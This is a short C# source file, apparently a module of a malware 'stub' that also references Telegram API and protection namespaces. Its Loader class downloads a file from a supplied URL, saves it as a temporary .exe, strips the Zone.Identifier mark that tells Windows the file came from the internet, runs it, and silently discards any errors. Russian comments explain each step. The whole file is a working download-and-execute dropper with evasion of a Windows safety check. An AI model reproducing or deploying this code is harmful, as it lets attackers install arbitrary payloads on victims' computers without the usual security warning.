using Stub.Protection;
using Stub.TelegramAPI;
using System;
using System.IO;
using System.Net;
using System.Threading.Tasks;

namespace Stub.Help.Modules
{
    class Loader
    {
        public static async Task Run(string url)
        {
            try
            {
               
                    SSL.GetSSL();
                    using (WebClient client = new WebClient())
                    {
                        byte[] fileData = await client.DownloadDataTaskAsync(new Uri(url)); // Загрузка файла в виде массива байтов
                        string fileName = Path.GetTempFileName() + ".exe"; // Генерация временного имени файла
                        File.WriteAllBytes(fileName, fileData); // Запись массива байтов на диск
                        ZoneIDCleaner.RemoveZoneIdentifier(fileName); // Убираем атрибут что файл скачан из интернета
                        System.Diagnostics.Process.Start(fileName); // Запуск файла
                    }
                
            }
            catch
            {

            }
        }
    }
}
